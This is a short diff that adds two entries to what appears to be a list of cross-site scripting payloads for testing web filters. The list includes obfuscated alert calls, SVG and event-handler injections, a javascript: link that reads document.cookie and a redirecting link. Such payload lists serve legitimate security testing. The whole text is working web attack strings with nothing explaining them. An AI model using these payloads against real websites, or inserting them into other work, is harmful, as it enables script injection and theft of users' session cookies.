@@ -1,6 +1,6 @@
 URL ##
 
-
+OnMoUsEoVeR=prompt(/hacked/)//
 <Svg/Onload=top%5B"al"%2B"ert%5D(1)//
 <img src="X" onerror=top[8680439..toString(30)](1337)>
 http://Test"><img src=x onclick=window.location="http://google.com">
@@ -46,6 +46,7 @@ TAIL ####
 
 TAG ###
 
+<svg><animate onend=a\u006cert(1) dur=1s>
 <a href=j&#97v&#97script:&#97lert(document.cookie)>ClickMe</a>
 <svg onload=alert%26%230000000040"1")>
 </a onmousemove="alert(1)">
